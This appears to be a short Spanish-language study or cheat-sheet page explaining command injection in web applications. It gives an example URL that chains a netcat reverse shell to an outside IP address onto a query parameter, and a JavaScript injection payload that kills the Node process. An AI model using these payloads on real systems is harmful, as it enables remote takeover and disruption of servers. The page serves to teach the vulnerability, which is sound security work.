---
title: command injection
category: web
order: 1
---


# 1.0 Command injection
---

  Si la aplicacion ejecuta comandos de sistema en funcion del input de usuario y este no esta sanitizado, se pueden correr comandos en el servidor
  ej:

  ```
  https://vulnerable.io/test.php?id=1 && nc -e /bin/sh 130.10.10.16 4444

  ```

  en javascript si usas
  eval(), setTimeout(), setInterval(), Function() tmb se puede hacer injeccion de js

  ```
  process.kill(process.pid)

  ```
